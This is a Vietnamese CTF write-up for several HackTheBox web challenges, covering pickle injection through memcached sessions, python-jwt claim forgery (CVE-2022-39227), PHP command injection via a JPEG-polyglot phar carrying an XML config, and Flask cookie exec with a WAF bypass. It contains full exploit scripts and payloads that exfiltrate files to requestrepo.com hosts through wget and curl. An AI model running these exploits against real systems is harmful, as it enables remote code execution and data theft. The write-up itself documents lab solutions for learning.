- Như ta có thể thấy sever config SESSION-Memcache lưu ở cồng `127.0.0.1:11211` bằng thư viện `pylibmc` đôi nét về `pylibmc`:

- Pylibmc là một gói thư viện Python dùng để tương tác với memcached, một hệ thống lưu trữ cache phổ biến. Pylibmc cung cấp các phương thức để kết nối, thao tác và quản lý dữ liệu trong memcached từ Python một cách dễ dàng và hiệu quả. Điều này cho phép các ứng dụng Python tận dụng các tính năng mạnh mẽ của memcached để cải thiện hiệu suất và khả năng mở rộng của họ.

- Có middlerware check nếu session > 86 thì gán lại session với 86 kí tự:
```
@app.before_request
def before_request():
    if session.get("session") and len(session["session"]) > 86:
        session["session"] = session["session"][:86]
```

- Route /set thì sẽ lấy `uicolor` và nếu tồn tại thì gán `session["uicolor"] = uicolor` và route / sẽ lấy giá trị ` uicolor = session.get("uicolor", "#f1f1f1")` và hiển thị màu cho template, nhìn vào thì cũng đoán được lỗi ở thư viện `pylibmc`.
- Google một chút ta ta biết được là có lỗ hổng deserialize trong quá trình giải mã session của python flask.
![image](https://hackmd.io/_uploads/S1IFarNCT.png)

* POC: 

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('ping -c 1 localhost')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
```

- Payload này sẽ thực hiện gửi các gói tin trong command os:
- ![image](https://hackmd.io/_uploads/rJyhn9NRp.png)

- Trên đây là hình ảnh gói tin bắt được ở wireshark.
* ATTACK

- Dùng POC trên:

```

import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget http://s6thtnzk.requestrepo.com/$(cat /f*)')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'\r\nset session:46db9856-90d1-4661-8935-9c8b4871a2aa 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:46db9856-90d1-4661-8935-9c8b4871a2aa')
    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
print(generate_exploit())

```
- Bởi bì session giới hạn số kí tự nên ta có thể sử dụng như trên.
- Lưu ý là build payload bằng linux hoặc ubuntu.
![image](https://hackmd.io/_uploads/rJKoRcN0a.png)

![image](https://hackmd.io/_uploads/BysH1oNR6.png)

```
"\015\012\163\145\164\040\163\145\163\163\151\157\156\072\064\066\144\142\071\070\065\066\055\071\060\144\061\055\064\066\066\061\055\070\071\063\065\055\071\143\070\142\064\070\067\061\141\062\141\141\040\060\040\062\065\071\062\060\060\060\040\067\071\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\072\057\057\163\066\164\150\164\156\172\153\056\162\145\161\165\145\163\164\162\145\160\157\056\143\157\155\057\044\050\143\141\164\040\057\146\052\051\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\163\145\163\163\151\157\156\072\064\066\144\142\071\070\065\066\055\071\060\144\061\055\064\066\066\061\055\070\071\063\065\055\071\143\070\142\064\070\067\061\141\062\141\141"
```

![image](https://hackmd.io/_uploads/ByUV8HqCA.png)

![image](https://hackmd.io/_uploads/r1ES8HqRA.png)

![image](https://hackmd.io/_uploads/BkDvUr50C.png)

Flag: `HTB{y0u_th0ught_th15_wou1d_b3_4_s1mpl3_t4sk?!}`


## LockTalk

https://github.com/advisories/GHSA-79q7-m98p-qvhp
CVE-2023-45539

![image](https://hackmd.io/_uploads/HyQSX8qAA.png)

CVE-2022-39227

https://github.com/user0x1337/CVE-2022-39227/blob/main/cve_2022_39227.py
poc: 

```
pip install python-jwt pyvows jwcrypto
from datetime import timedelta
from json import loads, dumps
import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode
from pprint import pprint
class ForgedClaims:
    def create(self):
        """ Generate token """
        # payload = {'sub': 'alice'}
        token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjc4NDcyMTksImlhdCI6MTcyNzg0MzYxOSwianRpIjoid1NiWUFZdk1US2VmTDAzX21ETE1ndyIsIm5iZiI6MTcyNzg0MzYxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.DwOp49SKVRFYUMcznNCyGBCQsQl1bdBEoC5tEiM85skC-VZ_JBueuNyCdnNcnJU0ODegZBnR4IaMwbmz0EIr_Qb6cf-_w_NS-QBJuG-h_vL6m5ZI52UvCJtapUerZC7swpvqPMaQi8eYHkmfVJCB9a432cGy8wTzM7nYmPDYLia9R1K17exyjO70nfC-vN39Shq00_oAUBvx3ciLcv1k97AdGGVRaq9Cq0_rGCtKaLqTPvS0QvMqcFYZadbcVPzkNSNiUYCWy7y0rpMwHUwBykMbQgckIYB4ZQs_x8eXWT0nBqhn2Dsz7gAAbmimQzssObe6_SI49_oSLgMJfRD6Ew"
        return token
    def topic(self, topic):
        """ Use mix of JSON and compact format to insert forged claims including long expiration """
        [header, payload, signature] = topic.split('.')
        parsed_payload = loads(base64url_decode(payload))
        print(parsed_payload)
        parsed_payload['role'] = 'administrator'
        parsed_payload['user'] = 'admin_user'
        print(parsed_payload)
        # parsed_payload['exp'] = 2000000000
        fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
        return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
claime__ = ForgedClaims()
jwt = claime__.create()
print(claime__.topic(jwt))

```

![image](https://hackmd.io/_uploads/HJxfQU9RA.png)

flag: `HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s_4t_bugg5_4nd_h4ck5}`


## Magicom

Một chương trình php viết theo mô hình mvc -> chall cung cấp rất chi là đầy đủ các cấu hình để ta phân tích.

Có thể quan sát đầy đủ các endpoint tại `index.php`:


```
<?php

spl_autoload_register(function ($name) {
    $parts = explode('\\', $name);
    $className = array_pop($parts);
    if (preg_match('/Controller$/', $name)) {
        $name = 'controllers/' . $name;
    }

    if (preg_match('/Model$/', $name)) {
        $name = 'models/' . $name;
    }

    $file = $name . '.php';

    if (is_file($file)) {
        require_once $file;
    }
});

$database = new Database('127.0.0.1', 'beluga', 'beluga', 'magicom');
$database->connect();

$router = new Router;

$router->get('/', 'HomeController@index');
$router->get('/home', 'HomeController@index');
$router->get('/product', 'ProductViewController@index');
$router->get('/addProduct', 'AddProductController@index');
$router->post('/addProduct', 'AddProductController@add');
$router->get('/info', function(){
    return phpinfo();
});

$router->resolve();
?>

```

có thể thấy hệ thống load các models và controller từ các package cùng cấp nằm trong các thư mục tương ứng, kết nối database

Sơ qua thì sẽ có 5 endpoint mỗi ep sẽ có một controller riêng để xử lý

`/` và `/home` thì đều hiển thị view home
`/product` thì hiển thị view product với thông tin của product nằm trong database.

```
public function get()
    {
        $result = $this->database->query('SELECT title, description, image_url FROM products');
        $products = array();
        
        while ($product = $result->fetch_assoc()) {
            $title = htmlspecialchars($product['title'], ENT_QUOTES, 'UTF-8');
            $description = htmlspecialchars($product['description'], ENT_QUOTES, 'UTF-8');
            $image_url = htmlspecialchars($product['image_url'], ENT_QUOTES, 'UTF-8');
        
            $products[] = array(
                'title' => $title,
                'description' => $description,
                'image_url' => $image_url
            );
        }

        return $products;
    }
```


`/addProduct` sẽ có 2 method là get và post nếu get thì hiển thị view còn post sẽ gọi phương thức add trong model.

```
public function add() 
    {
        if (empty($_FILES['image']) || empty($_POST['title']) || empty($_POST['description']))
        {
            header('Location: /addProduct?error=1&message=Fields can\'t be empty.');
            exit;
        }

        $title = $_POST["title"];
        $description = $_POST["description"];
        $image = new ImageModel($_FILES["image"]);

        if($image->isValid()) {

            $mimeType = mime_content_type($_FILES["image"]['tmp_name']);
            $extention = explode('/', $mimeType)[1];
            $randomName = bin2hex(random_bytes(8));
            $secureFilename = "$randomName.$extention";

            if(move_uploaded_file($_FILES["image"]["tmp_name"], "uploads/$secureFilename")) {
                $this->product->insert($title, $description, "uploads/$secureFilename");

                header('Location: /addProduct?error=0&message=Product added successfully.');
                exit;
            }
        } else {
            header('Location: /addProduct?error=1&message=Not a valid image.');
            exit;
        }
    }
```

Một obj image được khởi tạo mới từ class ImageModel `$image = new ImageModel($_FILES["image"]);`


```
<?php
class ImageModel {
    public function __construct($file) {
        $this->file = $file;
    }

    public function isValid() {

        $allowed_extensions = ["jpeg", "jpg", "png"];
        $file_extension = pathinfo($this->file["name"], PATHINFO_EXTENSION);
        // print_r($this->file); // Delete this
        if (!in_array($file_extension, $allowed_extensions)) {
            return false;
        }

        $allowed_mime_types = ["image/jpeg", "image/jpg", "image/png"];
        $mime_type = mime_content_type($this->file['tmp_name']);
        if (!in_array($mime_type, $allowed_mime_types)) {
            return false;
        }

        if (!getimagesize($this->file['tmp_name'])) {
            return false;
        }

        try {
            $imagick = new \Imagick($this->file['tmp_name']);
            $imagick->thumbnailImage(50, 50, true, true);
        } catch (Exception $e) {
            return false;
        }

        return true;
    }
}
?>
<?php

```

khởi tạo gán thuộc tính file check xem file có extention là jpeg, jpg, png hay không cuối cùng nếu hợp lệ thì cho qua.

ta sẽ được phép upload 1 file lên và tên của nó được random với extendtion ban đầu.

`/info` sẽ trả cho ta thông tin của ``phpinfo()``

Tạm thời thì ta sẽ chú ý đến đoạn upload file nhưng vẫn chưa có hướng để tìm được tên file được random.

và flag nằm tại `COPY flag.txt /root/flag.txt` vậy mục tiêu của ta là rce để hoàn thành thử thách.

Tất cả đã phân tích cần hết chỉ còn ngoại trừ một file cli.php

```
<?php

error_reporting(-1);

if (!isset( $_SERVER['argv'], $_SERVER['argc'] ) || !$_SERVER['argc']) {
    die("This script must be run from the command line!");
}

function passthruOrFail($command) {
    passthru($command, $status);
    if ($status) {
        exit($status);
    }
}

function isConfig($probableConfig) {
    if (!$probableConfig) {
        return null;
    }
    if (is_dir($probableConfig)) {
        return isConfig($probableConfig.\DIRECTORY_SEPARATOR.'config.xml');
    }

    if (file_exists($probableConfig)) {
        return $probableConfig;
    }
    if (file_exists($probableConfig.'.xml')) {
        return $probableConfig.'.xml';
    }
    return null;
};

function getConfig($name) {

    $configFilename = isConfig(getCommandLineValue("--config", "-c"));

    if ($configFilename) {
        $dbConfig = new DOMDocument();
        $dbConfig->load($configFilename);

        $var = new DOMXPath($dbConfig);
        foreach ($var->query('/config/db[@name="'.$name.'"]') as $var) {
            return $var->getAttribute('value');
        }
        return null;
    }
    return null;
}

function getCommandLineValue($longOption, $shortOption) {
    $argv = $_SERVER['argv'] ?? [];

    $longIndex = array_search($longOption, $argv);
    $shortIndex = array_search($shortOption, $argv);
    $index = false;
    $option = '';

    if ($longIndex !== false) {
        $index = $longIndex;
        $option = $argv[$longIndex + 1] ?? null;
    } elseif ($shortIndex !== false) {
        $index = $shortIndex;
        $option = $argv[$shortIndex + 1] ?? null;
    }

    return $option;
}

function generateFilename() {
    $timestamp = date("Ymd_His");
    $random = bin2hex(random_bytes(4));
    $filename = "backup_$timestamp" . "_$random.sql";
    return $filename;
}

function backup($filename, $username, $password, $database) {
    $backupdir = "/tmp/backup/";
    passthruOrFail("mysqldump -u$username -p$password $database > $backupdir$filename");
}

function import($filename, $username, $password, $database) {
    passthruOrFail("mysql -u$username -p$password $database < $filename");
}

function healthCheck() {
    $url = 'http://localhost:80/info';

    $headers = get_headers($url);

    $responseCode = intval(substr($headers[0], 9, 3));

    if ($responseCode === 200) {
        echo "[+] Daijobu\n";
    } else {
        echo "[-] Not Daijobu :(\n";
    }
}

$username = getConfig("username");
$password = getConfig("password");
$database = getConfig("database");

$mode = getCommandLineValue("--mode", "-m");

if($mode) {
    switch ($mode) {
        case 'import':
            $filename = getCommandLineValue("--filename", "-f");
            if(file_exists($filename)) {
                import($filename, $username, $password, $database);
            } else {
                die("No file imported!");
            }
            break;
        case 'backup':
            backup(generateFilename(), $username, $password, $database);
            break;
        case 'healthcheck':
            healthcheck();
            break;
        default:
            die("Unknown mode specified.");
            break;
        }
}
?>
```

Đầu tiên sẽ nhận các biến siêu toàn cục `if (!isset( $_SERVER['argv'], $_SERVER['argc'] ) || !$_SERVER['argc']) {
    die("This script must be run from the command line!");
}
` là argv và argc.

tiếp theo gán `$mode = getCommandLineValue("--mode", "-m");` 

```
function getCommandLineValue($longOption, $shortOption) {
    $argv = $_SERVER['argv'] ?? [];

    $longIndex = array_search($longOption, $argv);
    $shortIndex = array_search($shortOption, $argv);
    $index = false;
    $option = '';

    if ($longIndex !== false) {
        $index = $longIndex;
        $option = $argv[$longIndex + 1] ?? null;
    } elseif ($shortIndex !== false) {
        $index = $shortIndex;
        $option = $argv[$shortIndex + 1] ?? null;
    }

    return $option;
}
```

ở đây sẽ nhận mảng các argv là biến siêu toàn cục

nếu tồn tại sẽ check switch case nếu mode là import sẽ import một file name, nếu backup sẽ dumb một file .sql còn `healthcheck` sẽ check xem cổng 80 có hoạt động hay không.

Ta phát hiện ra sink tại đây:
![image](https://hackmd.io/_uploads/S1Uona5J1g.png)

Cả 2 hàm đều có nguy cơ xảy ra lỗi command injection và bất kì vị trí nào như username, password, filename

Tuy nhiên sau nhiều lần test thì mình thấy inject command với mysqldumb dễ dàng hơn nhiều so với mysql command -> mình sẽ chọn sink tại hàm `backup`

```
function backup($filename, $username, $password, $database) {
    $backupdir = "/tmp/backup/";
    passthruOrFail("mysqldump -u$username -p$password $database > $backupdir$filename");
}
```

Quan sát đối với hàm này nó sẽ nhận các tham số là $filename, $username, $password, $database.

Vòng ngược lại tìm chain đến source này -> như đã nói ở trên nếu mode của ta truyền vào là backup thì nó sẽ gọi đến hàm này 

![image](https://hackmd.io/_uploads/HySaTaqyye.png)

Tham số file name được sinh ra random cho nên ta bỏ qua vì không control được.

Còn lại 3 tham số:

![image](https://hackmd.io/_uploads/HyqzCTqJJe.png)

Cả 3 đều là giá trị trả ra của hàm:

![image](https://hackmd.io/_uploads/HJLNRacy1l.png)

với name được truyền vào -> đầu tiên nó kiểm tra:

`
$configFilename = isConfig(getCommandLineValue("--config", "-c"));
`

lấy value của option -c là viết tắt của --config -> kiểm tra với hàm:

![image](https://hackmd.io/_uploads/BkyRRpc1yl.png)

nếu biến không tồn tại trả về null | | nếu là thư mục thì gọi đệ quy với file `config.xml` nằm trong thư mục -> nếu tồn tại file hoặc file .xml với tên đó thì trả ra còn không thì trả về null

Quay lại với flow `configFilename` giá trị của biến được gán có thể là file hay file xml -> nếu tồn tại tên file thì load file đó với `DOMDocument` 

![image](https://hackmd.io/_uploads/BJIegCqkkx.png)
 cuối cùng tả về value mà nó load được với `DOMXPath`
 
 Do đó nếu file xml của ta nếu trông như thế này:
 
 ```
 <config>
<db name="username" value="root"/>
<db name="password" value="root"/>
<db name="database" value=""/>
</config>
 ```
 
 thì giá trị của biến 1 2 3 là value của chúng.
 
 Vậy nếu ta có thể control được value của từng trường thì có thể inject được -> ta thử test trên local
 
 ![image](https://hackmd.io/_uploads/rJz9gR9kke.png)

tạo một file xml và value như trên

Dùng mode backup + config là file xml ta vừa tạo:

![image](https://hackmd.io/_uploads/rJVJWRcyJg.png)

sau khi gửi thì flag đã được gửi oob ra domain của ta

![image](https://hackmd.io/_uploads/S1E-ZC9kyx.png)


Vậy câu hỏi đặt ra là làm sao để ta có thể có được một file xml như vậy trên server.

Chức năng add product cho phép ta upload một product và hiển thị ảnh với thông tin ta thêm

![image](https://hackmd.io/_uploads/ryUUZA9kye.png)

![image](https://hackmd.io/_uploads/HJhqzRqJkx.png)

Chú ý là tên của file tại đây cũng giống với trên trong hệ thống luôn

![image](https://hackmd.io/_uploads/B1SRfRq1kx.png)

![image](https://hackmd.io/_uploads/HJD1QR51Jl.png)

Do đó đây có thể là một điểm ta có thể lợi dụng

-> tiếp sau đó mình thử upload 1 file xml lên có được hay không

![image](https://hackmd.io/_uploads/B1kHXCcyyg.png)

Lúc này hệ thống báo là không cho phép

![image](https://hackmd.io/_uploads/rJMLXC5Jkl.png)

Bởi vì chỉ cho phép các extension như này:

![image](https://hackmd.io/_uploads/H18u70ck1l.png)

Đi lục lọi trong php.ini

![image](https://hackmd.io/_uploads/HklkE0qkkx.png)

ta thấy có phar có thể thực thi được

![image](https://hackmd.io/_uploads/rJqVVCqykl.png)

Mình nhớ lại trước đây đã từng làm một bài upload file phar trên root-me -> lục lại nó ngay, đối với bài này ta upload 1 file phar để inject code php và -> RCE, nhưng bài này sẽ tìm cách phar file xml như ta muốn ở trên vào nó -> sau đó nhờ wrapper phar:// để truy xuất đến file xml và nhận shell.


Ta có thể đọc blog này để hiểu rõ hơn : https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/

![image](https://hackmd.io/_uploads/HyFHBR9J1l.png)


Cơm gạo đã có bây giờ đi nấu cơm thôi:

```
<?php
    $png = "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";
    $xml_data = "<config><db name=\"username\" value=\"|| /readflag | curl -d @- 00br69e7.requestrepo.com ||\"/><db name=\"password\" value=\"root\"/><db name=\"database\" value=\"\"/></config>";
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->addFromString("a.xml", $xml_data);
    $phar->setStub($png."__HALT_COMPILER(); ?>");
    $phar->stopBuffering();

    rename('phar.phar', 'phar.png');
?>

```

như ta đã biết phần stub này sẽ kiểm tra file có hợp lệ hay không kiểu là nó check byte đầu của file xe nó là file gì ấy, ở đây mình lấy các byte đầu của file jpeg -> sau đó compress file a.xml vào nó với data rce -> sau đó đưa vào file phar và đổi tên thành .png

-> tiến hành upload nó:

![image](https://hackmd.io/_uploads/SyUMI0qykg.png)

![image](https://hackmd.io/_uploads/S1gQ8R9k1x.png)

ở đây thì mình đã thành công upload nó và như bạn thấy mặc dù mình để tên là .png nhưng mà upload lên nó vẫn nhận là jpeg cho thấy cấu trúc của file mình gen đã đúng

giờ thì truy cập đến xml với phar:// wrapper nữa thôi

![image](https://hackmd.io/_uploads/rJHtI0qyJx.png)

![image](https://hackmd.io/_uploads/BJBhLR51Je.png)

thành công nhận flag test -> giờ thì lên server lấy flag real nữa

![image](https://hackmd.io/_uploads/HyIwDRqk1g.png)

![image](https://hackmd.io/_uploads/r13OPAqkkx.png)

![image](https://hackmd.io/_uploads/B1J6PA5yJg.png)

![image](https://hackmd.io/_uploads/BkZAP05Jye.png)

![image](https://hackmd.io/_uploads/Hy_lu09kJg.png)

flag: `HTB{Br34k1ng_Cl1_4pps_fr0m_W3bs1t3_n0w_wh4t?}`

## interdimensional internet

```
# coded by d4rkstat1c
import requests
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

TARGET = 'http://<IP>:<PORT>/'
SECRET_KEY = '<SECRET_KEY>'

# PAYLOAD = u"""i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
# i('flask').session['x']=i('os').popen('ls').read()"""

PAYLOAD = u"""i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
i('flask').session['x']=i('os').popen('cat t*').read()"""

class flask_encoding:
	def __init__(self):
		scsi = SecureCookieSessionInterface()
		signer_kwargs = dict(
			key_derivation=scsi.key_derivation,
			digest_method=scsi.digest_method
		)
		self.serializer = URLSafeTimedSerializer(SECRET_KEY, salt=scsi.salt,
										serializer=scsi.serializer,
										signer_kwargs=signer_kwargs
										)

	def deserialize(self, cookie_str):
		return self.serializer.loads(cookie_str)

	def serialize(self, cookie_dict):
		return self.serializer.dumps(cookie_dict)

# waf bypass encoding
def encode_payload(payload):
    payload = u'"a"\nexec """' + payload + u'"""'
    blacklist = {
    '[': '\\x5b',
    '(': '\\x28',
    '_': '\\x5f',
    '.': '\\x2e'
    }
    for c,h in blacklist.items():
        if c in payload:
            payload = payload.replace(c, h)
    return payload

def modify_cookie(s):
	f = flask_encoding()
	cookie_dict = f.deserialize(s.cookies['session'])
	cookie_dict['ingredient'] = u'i'
	cookie_dict['measurements'] = encode_payload(PAYLOAD)
	s.cookies['session'] = f.serialize(cookie_dict)
	return s, f

def exec_rce(s, f):
	r = s.get(TARGET)
	try:
		enc_exfil_data = r.cookies['session']
	except KeyError:
		print('Exploit failed, session cookie not found!')
		exit(1)
	return f.deserialize(enc_exfil_data)

def main():
	s = requests.session()
	s.get(TARGET)

	s, f = modify_cookie(s)
	exfil_data = exec_rce(s, f)
	print(exfil_data['x'])

if __name__ == '__main__':
	main()
```

flag: `HTB{d1d_y0u_h4v3_FuN_c4lcul4t1nG_Th3_d4rK_m4tt3r?!}`

## Console

flag: `HTB{PhP!Cons0lE@ByTh3K+FoUnd+}`